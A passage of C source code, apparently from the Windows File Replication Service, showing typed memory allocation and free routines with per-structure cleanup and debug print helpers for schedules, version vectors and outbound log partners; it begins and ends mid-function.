        // Init the unicode filename string to point to internal alloc.
        //
        FilterEntry->UFileName.Buffer = FilterEntry->DFileName;
        FilterEntry->UFileName.MaximumLength = (USHORT)SizeDelta + sizeof(WCHAR);
        FilterEntry->UFileName.Length = 0;

        InitializeListHead(&FilterEntry->ChildHead);

        break;

    //
    // Allocate a QHASH table struct.  Just alloc the
    // base table.  An extension is allocated on the first collision.
    // *NOTE* caller specifies the size of the actual hash table and
    // the extension.  Caller also must store an address to a hash calc
    // function.
    //
    case QHASH_TABLE_TYPE:

        NodeSize = sizeof(QHASH_TABLE);
        Node = FrsAlloc(NodeSize + SizeDelta);
        QhashTable = (PQHASH_TABLE)Node;

        INITIALIZE_CRITICAL_SECTION(&QhashTable->Lock);
        InitializeListHead(&QhashTable->ExtensionListHead);

        QhashTable->BaseAllocSize = NodeSize + SizeDelta;
        QhashTable->NumberEntries = SizeDelta / sizeof(QHASH_ENTRY);

        if (SizeDelta <= QHASH_EXTENSION_MAX) {
            QhashTable->ExtensionAllocSize = sizeof(LIST_ENTRY) + SizeDelta;
        } else {
            QhashTable->ExtensionAllocSize = sizeof(LIST_ENTRY) + QHASH_EXTENSION_MAX;
        }

        QhashTable->HashRowBase = (PQHASH_ENTRY) (QhashTable + 1);

        SET_QHASH_TABLE_HASH_CALC(QhashTable, NULL);

        QhashTable->FreeList.Next = NULL;

        break;

    //
    // Allocate an Output Log Partner struct.
    // This is ultimately hooked to a Connection struct which provides the
    // Guid and version vector.
    //
    case OUT_LOG_PARTNER_TYPE:
        NodeSize = sizeof(OUT_LOG_PARTNER);
        Node = FrsAlloc(NodeSize);

        break;

    //
    // Allocate a WildcardEntry filter Entry struct.
    //
    case WILDCARD_FILTER_ENTRY_TYPE:

        NodeSize = sizeof(WILDCARD_FILTER_ENTRY);
        Node = FrsAlloc(NodeSize + SizeDelta);
        WildcardEntry = (PWILDCARD_FILTER_ENTRY)Node;
        //
        // Init the unicode filename string to point to internal alloc.
        //
        WildcardEntry->UFileName.Buffer = WildcardEntry->FileName;
        WildcardEntry->UFileName.MaximumLength = (USHORT)SizeDelta;
        WildcardEntry->UFileName.Length = 0;

        break;

    //
    // Allocate a ReparseTagTable entry.
    //
    case REPARSE_TAG_TABLE_ENTRY_TYPE:

        NodeSize = sizeof(REPARSE_TAG_TABLE_ENTRY);
        Node = FrsAlloc(NodeSize);
        ReparseTagTableEntry = (PREPARSE_TAG_TABLE_ENTRY)Node;

        if(SizeDelta) {
            ReparseTagTableEntry->ReplicationType = FrsAlloc(SizeDelta);
        } else {
            ReparseTagTableEntry->ReplicationType = NULL;
        }


        break;
    //
    // Invalid Node Type
    //
    default:
        Node = NULL;
        DPRINT1(0, "Internal error - invalid node type - %d\n", NodeType);
        XRAISEGENEXCEPTION(FrsErrorInternalError);
    }

    //
    // Set up the header for later checking in FrsFreeType
    //
    ((PFRS_NODE_HEADER) Node)->Type = (USHORT) NodeType;
    ((PFRS_NODE_HEADER) Node)->Size = (USHORT) NodeSize;

    //
    // Tracking memory expansion
    //
    EnterCriticalSection(&MemLock);
    TypesAllocated[NodeType]++;
    TypesAllocatedCount[NodeType]++;
    if (TypesAllocated[NodeType] > TypesAllocatedMax[NodeType]) {
        TypesAllocatedMax[NodeType] = TypesAllocated[NodeType];
    }
    LeaveCriticalSection(&MemLock);

    //
    // Return node address to caller.
    //
    return Node;
}


PVOID
FrsFreeType(
    IN PVOID Node
    )
/*++

Routine Description:

    This routine frees memory for the given node, performing any node specific
    cleanup.  It marks the freed memory with the hex string 0xDEADBEnn where
    the low byte (nn) is set to the node type being freed to catch users of
    stale pointers.

Arguments:

    Node - The address of the node to free.

Return Value:

    NULL.  Typical call is:  ptr = FrsFreeType(ptr) to catch errors.

--*/
{
#undef DEBSUB
#define DEBSUB "FrsFreeType:"

    ULONG                  NodeSize;
    ULONG                  NodeType;
    ULONG                  Marker;
    PREPLICA               Replica;
    PREPLICA_THREAD_CTX    RtCtx;
    PTABLE_CTX             TableCtx;
    PTHREAD_CTX            ThreadCtx;
    ULONG                  i;
    PVOLUME_MONITOR_ENTRY  pVme;
    PFILTER_TABLE_ENTRY    FilterEntry;
    PQHASH_TABLE           QhashTable;
    PLIST_ENTRY            Entry;
    PCXTION                Cxtion;
    PCONFIG_NODE           ConfigNode;
    PCHANGE_ORDER_ENTRY    ChangeOrder;
    PGHANDLE               GHandle;
    PHANDLE_LIST           HandleList;
    PWILDCARD_FILTER_ENTRY WildcardEntry;
    POUT_LOG_PARTNER       OutLogPartner;
    PREPARSE_TAG_TABLE_ENTRY ReparseTagTableEntry;


    if (Node == NULL) {
        return NULL;
    }

    NodeType = (ULONG) (((PFRS_NODE_HEADER) Node)->Type);
    NodeSize = (ULONG) (((PFRS_NODE_HEADER) Node)->Size);

    switch (NodeType) {
    //
    // Free a Thread Context struct
    //
    case THREAD_CONTEXT_TYPE:
        if (NodeSize != sizeof(THREAD_CTX)) {
            DPRINT1(0, "FrsFree - Bad node size %d for THREAD_CONTEXT\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        ThreadCtx = (PTHREAD_CTX) Node;
        FrsRtlDeleteList(&ThreadCtx->ThreadCtxListHead);

        break;

    //
    // Free a Replica struct
    //
    case REPLICA_TYPE:
        if (NodeSize != sizeof(REPLICA)) {
            DPRINT1(0, "FrsFree - Bad node size %d for REPLICA\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        Replica = (PREPLICA) Node;
        //
        // Free the config table context.
        //
        DbsFreeTableCtx(&Replica->ConfigTable, NodeType);
        FrsRtlDeleteList(&Replica->ReplicaCtxListHead);

        //
        // Empty the file and directory filter lists
        //
        FrsEmptyNameFilter(&Replica->FileNameFilterHead);
        FrsEmptyNameFilter(&Replica->FileNameInclFilterHead);
        FrsEmptyNameFilter(&Replica->DirNameFilterHead);
        FrsEmptyNameFilter(&Replica->DirNameInclFilterHead);
        FrsFree(Replica->FileFilterList);
        FrsFree(Replica->FileInclFilterList);
        FrsFree(Replica->DirFilterList);
        FrsFree(Replica->DirInclFilterList);


        DeleteCriticalSection(&Replica->ReplicaLock);
        DeleteCriticalSection(&Replica->OutLogLock);
        if (Replica->OutLogRecordLock != NULL) {
            //
            // Free the record lock table.
            //
            Replica->OutLogRecordLock = FrsFreeType(Replica->OutLogRecordLock);
        }

        //
        // queue
        //
        if (Replica->Queue) {
            FrsRtlDeleteQueue(Replica->Queue);
            FrsFree(Replica->Queue);
        }

        //
        // free the initsync queue.
        //
        if (Replica->InitSyncQueue) {
            FrsRtlDeleteQueue(Replica->InitSyncQueue);
            Replica->InitSyncQueue = FrsFree(Replica->InitSyncQueue);
        }

        //
        // Names
        //
        FrsFree(Replica->Root);
        FrsFree(Replica->Stage);
        FrsFree(Replica->NewStage);
        FrsFree(Replica->Volume);
        FrsFreeGName(Replica->ReplicaName);
        FrsFreeGName(Replica->SetName);
        FrsFreeGName(Replica->MemberName);

        //
        // Root Guid
        //
        FrsFree(Replica->ReplicaRootGuid);

        //
        // Status of sysvol seeding
        //
        FrsFree(Replica->NtFrsApi_ServiceDisplay);

        //
        // Schedule
        //
        FrsFree(Replica->Schedule);
        //
        // VVector
        //
        VVFree(Replica->VVector);
        //
        // OutlogVVector
        //
        VVFree(Replica->OutlogVVector);
        //
        // Cxtions
        //
        GTabFreeTable(Replica->Cxtions, FrsFreeType);

        //
        // Preinstall directory
        //
        FRS_CLOSE(Replica->PreInstallHandle);

        //
        // Free the counter data structure memory
        //
        if (Replica->PerfRepSetData != NULL) {
            if (Replica->PerfRepSetData->oid != NULL) {
                if (Replica->PerfRepSetData->oid->name != NULL) {
                    Replica->PerfRepSetData->oid->name =
                        FrsFree(Replica->PerfRepSetData->oid->name);
                }
                Replica->PerfRepSetData->oid =
                    FrsFree(Replica->PerfRepSetData->oid);
            }
            Replica->PerfRepSetData = FrsFree(Replica->PerfRepSetData);
        }

        break;

    //
    // Free a Replica Thread Context struct
    //
    case REPLICA_THREAD_TYPE:
        if (NodeSize != sizeof(REPLICA_THREAD_CTX)) {
            DPRINT1(0, "FrsFree - Bad node size %d for REPLICA_THREAD_CTX\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        RtCtx = (PREPLICA_THREAD_CTX) Node;

        //
        // Get the base of the array of TableCtx structs from the replica thread
        // context struct.
        //
        TableCtx = RtCtx->RtCtxTables;

        //
        // Release the memory for each table context struct.
        //
        for (i=0; i<TABLE_TYPE_MAX; ++i, ++TableCtx)
            DbsFreeTableCtx(TableCtx, NodeType);

        break;

    //
    // Free a topology node
    //
    case CONFIG_NODE_TYPE:
        if (NodeSize != sizeof(CONFIG_NODE)) {
            DPRINT1(0, "FrsFree - Bad node size %d for CONFIG_NODE\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        ConfigNode = (PCONFIG_NODE) Node;
        FrsFreeGName(ConfigNode->Name);
        FrsFreeGName(ConfigNode->PartnerName);
        FrsFree(ConfigNode->Root);
        FrsFree(ConfigNode->Stage);
        FrsFree(ConfigNode->Schedule);
        FrsFree(ConfigNode->Dn);
        FrsFree(ConfigNode->PrincName);
        FrsFree(ConfigNode->PartnerDn);
        FrsFree(ConfigNode->PartnerCoDn);
        FrsFree(ConfigNode->SettingsDn);
        FrsFree(ConfigNode->ComputerDn);
        FrsFree(ConfigNode->MemberDn);
        FrsFree(ConfigNode->Working);
        FrsFree(ConfigNode->SetType);
        FrsFree(ConfigNode->FileFilterList);
        FrsFree(ConfigNode->DirFilterList);
        FrsFree(ConfigNode->UsnChanged);
        FrsFree(ConfigNode->DnsName);
        FrsFree(ConfigNode->PartnerDnsName);
        FrsFree(ConfigNode->Sid);
        FrsFree(ConfigNode->PartnerSid);
        FrsFree(ConfigNode->EnabledCxtion);
        break;

    //
    // Free a connection
    //
    case CXTION_TYPE:
        if (NodeSize != sizeof(CXTION)) {
            DPRINT1(0, "FrsFree - Bad node size %d for CXTION\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        Cxtion = (PCXTION) Node;
        VVFreeOutbound(Cxtion->VVector);

        //
        // Free the CompressionTable that was build for the outbound partner.
        //
        GTabFreeTable(Cxtion->CompressionTable, FrsFree);

        //
        // Free the OutLogPartner context.
        //
        FrsFreeType(Cxtion->OLCtx);

        SndCsDestroyCxtion(Cxtion, CXTION_FLAGS_UNJOIN_GUID_VALID);
        if (Cxtion->CommTimeoutCmd) {
            //
            // Try to catch the case where a Comm Time Out wait command is
            // getting freed while it is still on the timeout queue.  This is
            // related to a bug where we get into a comm timeout loop with an
            // invalid command code.
            //
            FRS_ASSERT(!CxtionFlagIs(Cxtion, CXTION_FLAGS_TIMEOUT_SET));

            FRS_ASSERT(!CmdWaitFlagIs(Cxtion->CommTimeoutCmd, CMD_PKT_WAIT_FLAGS_ONLIST));

            FrsFreeType(Cxtion->CommTimeoutCmd);
        }
        //
        // A cxtion doesn't actually "own" the join command packet; it
        // only maintains a reference to prevent extraneous join commands
        // from flooding the replica's queue.
        //
        Cxtion->JoinCmd = NULL;

        //
        // VvJoin Command Server (1 per cxtion)
        //
        if (Cxtion->VvJoinCs) {
            FrsRunDownCommandServer(Cxtion->VvJoinCs,
                                    &Cxtion->VvJoinCs->Queue);
            FrsDeleteCommandServer(Cxtion->VvJoinCs);
            FrsFree(Cxtion->VvJoinCs);
        }

        if (!Cxtion->ChangeOrderCount) {
            GTabFreeTable(Cxtion->CoeTable, NULL);
        }
        FrsFreeGName(Cxtion->Name);
        FrsFreeGName(Cxtion->Partner);
        FrsFree(Cxtion->PartnerPrincName);
        FrsFree(Cxtion->Schedule);
        FrsFree(Cxtion->PartSrvName);
        FrsFree(Cxtion->PartnerDnsName);
        FrsFree(Cxtion->PartnerSid);

        //
        // Delete the connection from the perfmon tables.
        // Free the counter data structure memory
        //
        if (Cxtion->PerfRepConnData != NULL) {
            if (Cxtion->PerfRepConnData->oid != NULL) {
                DeletePerfmonInstance(REPLICACONN, Cxtion->PerfRepConnData);
            }
            Cxtion->PerfRepConnData = FrsFree(Cxtion->PerfRepConnData);
        }

        break;

    //
    // Free a guid/rpc handle
    //
    case GHANDLE_TYPE:
        if (NodeSize != sizeof(GHANDLE)) {
            DPRINT2(0, "FrsFree - Bad node size %d (%d) for GHANDLE\n",
                    NodeSize, sizeof(GHANDLE));
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        GHandle = (PGHANDLE)Node;
        while (HandleList = GHandle->HandleList) {
            GHandle->HandleList = HandleList->Next;
            FrsRpcUnBindFromServer(&HandleList->RpcHandle);
            FrsFree(HandleList);
        }
        DeleteCriticalSection(&GHandle->Lock);

        break;

    //
    // Free a generic table
    //
    case GEN_TABLE_TYPE:
        if (NodeSize != sizeof(GEN_TABLE)) {
            DPRINT1(0, "FrsFree - Bad node size %d for GEN_TABLE\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        break;

    //
    // Free a generic thread context
    //
    case THREAD_TYPE:
        if (NodeSize != sizeof(FRS_THREAD)) {
            DPRINT1(0, "FrsFree - Bad node size %d for FRS_THREAD\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        break;

    //
    // Free a journal read buffer.
    //
    case JBUFFER_TYPE:
        if (NodeSize != SizeOfJournalBuffer) {
            DPRINT1(0, "FrsFree - Bad node size %d for JBUFFER\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        break;

    //
    // Free a journal volume monitor entry.
    //
    case VOLUME_MONITOR_ENTRY_TYPE:
        if (NodeSize != sizeof(VOLUME_MONITOR_ENTRY)) {
            DPRINT1(0, "FrsFree - Bad node size %d for VOLUME_MONITOR_ENTRY\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        pVme = (PVOLUME_MONITOR_ENTRY) Node;

        FrsRtlDeleteList(&pVme->ReplicaListHead);
        DeleteCriticalSection(&pVme->Lock);
        DeleteCriticalSection(&pVme->QuadWriteLock);
        FRS_CLOSE(pVme->Event);

        //
        // Release the change order hash table.
        //
        GhtDestroyTable(pVme->ChangeOrderTable);
        //
        // Release the Filter Hash Table.
        //
        GhtDestroyTable(pVme->FilterTable);

        break;


    //
    // Free a command packet.
    //
    case COMMAND_PACKET_TYPE:
        if (NodeSize != sizeof(COMMAND_PACKET)) {
            DPRINT1(0, "FrsFree - Bad node size %d for COMMAND_PACKET\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        break;

    //
    // Free a generic hash table struct.
    //
    case GENERIC_HASH_TABLE_TYPE:
        if (NodeSize != sizeof(GENERIC_HASH_TABLE)) {
            DPRINT1(0, "FrsFree - Bad node size %d for GENERIC_HASH_TABLE\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        break;

    //
    // Free a Change Order Entry struct.
    //
    case CHANGE_ORDER_ENTRY_TYPE:
        if (NodeSize != sizeof(CHANGE_ORDER_ENTRY)) {
            DPRINT1(0, "FrsFree - Bad node size %d for CHANGE_ORDER_ENTRY\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        ChangeOrder = (PCHANGE_ORDER_ENTRY)Node;

        //
        // If we allocated a new name string then free it.
        //
        if (ChangeOrder->UFileName.Buffer != ChangeOrder->Cmd.FileName) {
            FrsFree(ChangeOrder->UFileName.Buffer);
        }

        //
        // Free the full file name.
        //
        if (ChangeOrder->FullPathName != NULL) {
            FrsFree(ChangeOrder->FullPathName);
        }

        //
        // Free the change order extenstion.
        //
        if (ChangeOrder->Cmd.Extension != NULL) {
            FrsFree(ChangeOrder->Cmd.Extension);
        }

        break;

    //
    // Free a Filter Table Entry struct.
    //
    case FILTER_TABLE_ENTRY_TYPE:
        if (NodeSize != sizeof(FILTER_TABLE_ENTRY)) {
            DPRINT1(0, "FrsFree - Bad node size %d for FILTER_TABLE_ENTRY\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        FilterEntry = (PFILTER_TABLE_ENTRY)Node;

        //
        // If we allocated a new name string then free it.
        //
        if (FilterEntry->UFileName.Buffer != FilterEntry->DFileName) {
            FrsFree(FilterEntry->UFileName.Buffer);
        }

        break;


    //
    // Free a QHASH table struct.
    //
    case QHASH_TABLE_TYPE:
        if (NodeSize != sizeof(QHASH_TABLE)) {
            DPRINT1(0, "FrsFree - Bad node size %d for QHASH_TABLE\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        QhashTable = (PQHASH_TABLE)Node;

        QHashEmptyLargeKeyTable(QhashTable);
        //
        // Free up all the extensions we allocated.
        //
        while (!IsListEmpty(&QhashTable->ExtensionListHead)) {
            Entry = GetListHead(&QhashTable->ExtensionListHead);
            FrsRemoveEntryList(Entry);
            FrsFree(Entry);
        }

        DeleteCriticalSection(&QhashTable->Lock);
        break;

    //
    // Free an Output Log Partner struct.
    //
    case OUT_LOG_PARTNER_TYPE:
        if (NodeSize != sizeof(OUT_LOG_PARTNER)) {
            DPRINT1(0, "FrsFree - Bad node size %d for OUT_LOG_PARTNER\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }
        OutLogPartner = (POUT_LOG_PARTNER)Node;
        //
        // Free the Must send QHash Table.
        //
        OutLogPartner->MustSendTable = FrsFreeType(OutLogPartner->MustSendTable);
        break;

    //
    // Free a Wildcard file filter Entry struct.
    //
    case WILDCARD_FILTER_ENTRY_TYPE:
        if (NodeSize != sizeof(WILDCARD_FILTER_ENTRY)) {
            DPRINT1(0, "FrsFree - Bad node size %d for WILDCARD_FILTER_ENTRY\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        WildcardEntry = (PWILDCARD_FILTER_ENTRY)Node;

        //
        // Free the name buffer if it no longer points at the initial alloc.
        //
        if (WildcardEntry->UFileName.Buffer != WildcardEntry->FileName) {
            FrsFree(WildcardEntry->UFileName.Buffer);
        }

        break;

    //
    // Free a ReparseTagTable entry.
    //
    case REPARSE_TAG_TABLE_ENTRY_TYPE:
        if (NodeSize != sizeof(REPARSE_TAG_TABLE_ENTRY)) {
            DPRINT1(0, "FrsFree - Bad node size %d for REPARSE_TAG_TABLE_ENTRY\n", NodeSize);
            XRAISEGENEXCEPTION(FrsErrorInternalError);
        }

        ReparseTagTableEntry = (PREPARSE_TAG_TABLE_ENTRY)Node;

        FrsFree(ReparseTagTableEntry->ReplicationType);

        break;
    //
    // Invalid Node Type
    //
    default:
        Node = NULL;
        DPRINT1(0, "Internal error - invalid node type - %d\n", NodeType);
        XRAISEGENEXCEPTION(FrsErrorInternalError);
    }

    EnterCriticalSection(&MemLock);
    TypesAllocated[NodeType]--;
    LeaveCriticalSection(&MemLock);

    //
    // Fill the node with a marker then free it.
    //
    Marker = (ULONG) 0xDEADBE00 + NodeType;
    FillMemory(Node, NodeSize, (BYTE)Marker);
    return FrsFree(Node);
}



VOID
FrsFreeTypeList(
    PLIST_ENTRY Head
    )
/*++

Routine Description:

    Free all the "typed" entries on the specified list.

    Note:  This routine requires that the LIST_ENTRY struct in each
    list entry immediately follow the FRS_NODE_HEADER and of course that
    the list entry is actually linked through that LIST_ENTRY struct.

Arguments:

    Head -- ptr to the list head.

Thread Return Value:

    None.

--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsFreeTypeList:"

    PLIST_ENTRY Entry;
    PFRS_NODE_HEADER Header;

    Entry = RemoveHeadList(Head);

    while (Entry != Head) {
        Header = (PFRS_NODE_HEADER) CONTAINING_RECORD(Entry, COMMAND_PACKET, ListEntry);
        if ((Header->Type >= NODE_TYPE_MIN) &&
            (Header->Type < NODE_TYPE_MAX)) {
            FrsFreeType(Header);
        } else {
            DPRINT(0, "Node type out of range.  Not freed.\n");
        }
        Entry = RemoveHeadList(Head);
    }
}


VOID
FrsPrintGNameForNode(
    IN ULONG    Severity,
    IN PGNAME   GName,
    IN PWCHAR   Indent,
    IN PWCHAR   Id,
    IN PCHAR    Debsub,
    IN ULONG    uLineNo
    )
/*++

Routine Description:

    Pretty print a gname for FrsPrintNode()

Arguments:

    Severity -- Severity level for print.  (See debug.c, debug.h)

    GName - The address of the GName to print.

    Indent - line indentation

    Id - identifies the gname

    Debsub -- Name of calling subroutine.

    uLineno -- Line number of caller

Return Value:

    none.

--*/
{
    CHAR    GuidStr[GUID_CHAR_LEN];

    if (GName) {
        if (GName->Name) {
            FRS_DEB_PRINT3("%ws%ws: %ws\n", Indent, Id, GName->Name);
        } else {
            FRS_DEB_PRINT3("%wsNO %ws->NAME for %08x\n", Indent, Id, GName);
        }
        if (GName->Guid) {
            GuidToStr(GName->Guid, GuidStr);
            FRS_DEB_PRINT3("%ws%wsGuid: %s\n", Indent, Id, GuidStr);
        } else {
            FRS_DEB_PRINT3("%wsNO %ws->GUID for %08x\n", Indent, Id, GName);
        }
    } else {
        FRS_DEB_PRINT3("%wsNO %ws for %08x\n", Indent, Id, GName);
    }
}


VOID
FrsPrintTypeSchedule(
    IN ULONG            Severity,   OPTIONAL
    IN PNTFRSAPI_INFO   Info,       OPTIONAL
    IN DWORD            Tabs,       OPTIONAL
    IN PSCHEDULE        Schedule,
    IN PCHAR            Debsub,     OPTIONAL
    IN ULONG            uLineNo     OPTIONAL
    )
/*++
Routine Description:
    Print a schedule.

Arguments:
    Severity    - for DPRINTs
    Info        - RPC output buffer
    Tabs        - prettyprint
    Schedule    - schedule blob
    Debsub      - for DPRINTs
    uLineNo     - for DPRINTs

Return Value:
    None.
--*/
{
    ULONG   i;
    ULONG   Day;
    ULONG   Hour;
    ULONG   LineLen;
    PUCHAR  ScheduleData;
    CHAR    Line[256];
    WCHAR   TabW[MAX_TAB_WCHARS + 1];

    if (!Schedule) {
        return;
    }

    InfoTabs(Tabs, TabW);

    for (i = 0; i < Schedule->NumberOfSchedules; ++i) {
        ScheduleData = ((PUCHAR)Schedule) + Schedule->Schedules[i].Offset;
        if (Schedule->Schedules[i].Type != SCHEDULE_INTERVAL) {
            continue;
        }
        for (Day = 0; Day < 7; ++Day) {
            if (_snprintf(Line, sizeof(Line) - 1, "%wsDay %1d: ", TabW, Day + 1) < 0) {
                Line[sizeof(Line) - 1] = '\0';
                break;
            }
        Line[sizeof(Line) - 1] = '\0';
            for (Hour = 0; Hour < 24; ++Hour) {
                LineLen = strlen(Line);
                if (_snprintf(&Line[LineLen],
                          sizeof(Line) - LineLen,
                          "%1x",
                          *(ScheduleData + (Day * 24) + Hour) & 0x0F) < 0) {

                    Line[sizeof(Line) - 1] = '\0';
                    break;
                }
            }
            ITPRINT1("%s\n", Line);
        }
    }
}


VOID
FrsPrintTypeVv(
    IN ULONG            Severity,   OPTIONAL
    IN PNTFRSAPI_INFO   Info,       OPTIONAL
    IN DWORD            Tabs,       OPTIONAL
    IN PGEN_TABLE       Vv,
    IN PCHAR            Debsub,     OPTIONAL
    IN ULONG            uLineNo     OPTIONAL
    )
/*++
Routine Description:
    Print a version vector

Arguments:
    Severity    - for DPRINTs
    Info        - RPC output buffer
    Tabs        - prettyprint
    Vv          - Version vector table
    Debsub      - for DPRINTs
    uLineNo     - for DPRINTs

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB  "FrsPrintTypeVv:"
    PVOID       Key;
    PVV_ENTRY   MasterVVEntry;
    WCHAR       TabW[MAX_TAB_WCHARS + 1];
    CHAR        Guid[GUID_CHAR_LEN + 1];

    if (!Vv) {
        return;
    }
    InfoTabs(Tabs, TabW);

    Key = NULL;
    while (MasterVVEntry = GTabNextDatum(Vv, &Key)) {
        if (!Info) {
            DebLock();
        }

        try {
            GuidToStr(&MasterVVEntry->GVsn.Guid, Guid);
            ITPRINT3("%wsVvEntry: %s = %08x %08x\n",
                     TabW, Guid, PRINTQUAD(MasterVVEntry->GVsn.Vsn));
        } finally {
            //
            // If the above took an exception make sure we drop the lock.
            //
            if (!Info) {
                DebUnLock();
            }
        }
    }
}


VOID
FrsPrintTypeOutLogAVToStr(
    POUT_LOG_PARTNER OutLogPartner,
    ULONG RetireCOx,
    PCHAR *OutStr1,
    PCHAR *OutStr2,
    PCHAR *OutStr3
    )
{
#undef DEBSUB
#define DEBSUB "FrsPrintTypeOutLogAVToStr:"
    PCHAR Str, Str2, Str3;
    ULONG j, Slotx, MaxSlotx, COx, Fill, Scan;
    //
    // Caller frees strings with FrsFree(Str).
    //
    Str  = FrsAlloc(3*(ACK_VECTOR_SIZE+4));
    Str2 = Str  + (ACK_VECTOR_SIZE+4);
    Str3 = Str2 + (ACK_VECTOR_SIZE+4);

    COx = OutLogPartner->COTx;
    Slotx = AVSlot(OutLogPartner->COTx, OutLogPartner);

    MaxSlotx = Slotx + ACK_VECTOR_SIZE;
    while (Slotx < MaxSlotx) {
        j = Slotx & (ACK_VECTOR_SIZE-1);
        if (ReadAVBitBySlot(Slotx, OutLogPartner) == 0) {
            Str[j] = '.';
        } else {
            Str[j] = '1';
        }

        if (COx == OutLogPartner->COTx) {
            Str2[j] = 'T';
        } else
        if (COx == OutLogPartner->COLx) {
            Str2[j] = 'L';
        } else {
            Str2[j] = '_';
        }

        if (COx == RetireCOx) {
            Str3[j] = '^';
        } else {
            Str3[j] = ' ';
        }

        COx += 1;
        Slotx += 1;
    }
    Str[ACK_VECTOR_SIZE] = '\0';
    Str2[ACK_VECTOR_SIZE] = '\0';
    Str3[ACK_VECTOR_SIZE] = '\0';

    //
    // Compress out blocks of 8
    //
    Fill = 0;
    Scan = 0;
    while (Scan < ACK_VECTOR_SIZE) {
        for (j=Scan; j < Scan+8; j++) {
            if ((Str[j] != '.') || (Str2[j] != '_')  || (Str3[j] != ' ')) {
                break;
            }
        }

        if (j == Scan+8) {
            // Compress out this block
            Str[Fill] = Str2[Fill] = Str3[Fill] = '-';
            Fill += 1;
        } else {
            // Copy this block to fill point of strings.
            for (j=Scan; j < Scan+8; j++) {
                Str[Fill] = Str[j];
                Str2[Fill] = Str2[j];
                Str3[Fill] = Str3[j];
                Fill += 1;
            }
        }
        Scan += 8;
    }

    Str[Fill] = Str2[Fill] = Str3[Fill] = '\0';

    *OutStr1 = Str;
    *OutStr2 = Str2;
    *OutStr3 = Str3;

    return;
}


VOID
FrsPrintTypeOutLogPartner(
    IN ULONG            Severity,   OPTIONAL
    IN PNTFRSAPI_INFO   Info,       OPTIONAL
    IN DWORD            Tabs,       OPTIONAL
    IN POUT_LOG_PARTNER Olp,
    IN ULONG            RetireCox,
    IN PCHAR            Description,
    IN PCHAR            Debsub,     OPTIONAL
    IN ULONG            uLineNo     OPTIONAL
    )
/*++
Routine Description:
    Print an outlog partner

Arguments:
    Severity    - for DPRINTs
    Info        - RPC output buffer
    Tabs        - prettyprint
    Olp         - Out log partner struct
    RetireCox   - change order index for ack vector
    Description - description of caller
    Debsub      - for DPRINTs
    uLineNo     - for DPRINTs

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB  "FrsPrintTypeOutLogPartner:"
    PCHAR   OutStr1, OutStr2, OutStr3;
    CHAR    FBuf[120];
    CHAR    TimeStr[TIME_STRING_LENGTH];
    WCHAR   TabW[MAX_TAB_WCHARS + 1];

    InfoTabs(Tabs, TabW);

    if (!Info) {
        DebLock();
    }

    try {
        ITPRINT2("%wsOutLogPartner   : %s\n", TabW, Description);

        if (Olp->Cxtion && Olp->Cxtion->Name) {
            ITPRINT2( "%wsCxtion          : %ws\n", TabW, Olp->Cxtion->Name->Name);
            if (Olp->Cxtion->Partner && Olp->Cxtion->Partner->Name) {
                ITPRINT2( "%wsPartner         : %ws\n", TabW, Olp->Cxtion->Partner->Name);
            }
        }


        FrsFlagsToStr(Olp->Flags, OlpFlagNameTable, sizeof(FBuf), FBuf);
        ITPRINT3("%wsFlags           : %08x Flags [%s]\n", TabW, Olp->Flags, FBuf);

        ITPRINT2("%wsState           : %s\n",  TabW, OLPartnerStateNames[Olp->State]);
        ITPRINT2("%wsCoTx            : %8d\n", TabW, Olp->COTx);
        ITPRINT2("%wsCoLx            : %8d\n", TabW, Olp->COLx);
        ITPRINT2("%wsCOLxRestart     : %8d\n", TabW, Olp->COLxRestart);
        ITPRINT2("%wsCOLxVVJoinDone  : %8d\n", TabW, Olp->COLxVVJoinDone);
        ITPRINT2("%wsCoTxSave        : %8d\n", TabW, Olp->COTxNormalModeSave);
        ITPRINT2("%wsCoTslot         : %8d\n", TabW, Olp->COTslot);
        ITPRINT2("%wsOutstandingCos  : %8d\n", TabW, Olp->OutstandingCos);
        ITPRINT2("%wsOutstandingQuota: %8d\n", TabW, Olp->OutstandingQuota);

        FileTimeToString((PFILETIME) &Olp->AckVersion, TimeStr);
        ITPRINT2("%wsAckVersion      : %s\n" , TabW, TimeStr);

        if (RetireCox != -1) {
            ITPRINT2("%wsRetireCox       : %8d\n", TabW, RetireCox);
        }

        FrsPrintTypeOutLogAVToStr(Olp, RetireCox, &OutStr1, &OutStr2, &OutStr3);

        //
        // keep output together.
        //
        ITPRINT2("%wsAck: |%s|\n", TabW, OutStr1);
        ITPRINT2("%wsAck: |%s|\n", TabW, OutStr2);
        ITPRINT2("%wsAck: |%s|\n", TabW, OutStr3);
        FrsFree(OutStr1);

    } finally {
        //
        // If the above took an exception make sure we drop the lock.
        //
        if (!Info) {
            DebUnLock();
        }
    }
}


VOID
FrsPrintTypeCxtion(
    IN ULONG            Severity,   OPTIONAL
    IN PNTFRSAPI_INFO   Info,       OPTIONAL
    IN DWORD            Tabs,       OPTIONAL
    IN PCXTION          Cxtion,
    IN PCHAR            Debsub,     OPTIONAL
    IN ULONG            uLineNo     OPTIONAL
    )
/*++
Routine Description:
    Print a cxtion

Arguments:
    Severity    - for DPRINTs
    Info        - RPC output buffer
    Tabs        - prettyprint
    Cxtion
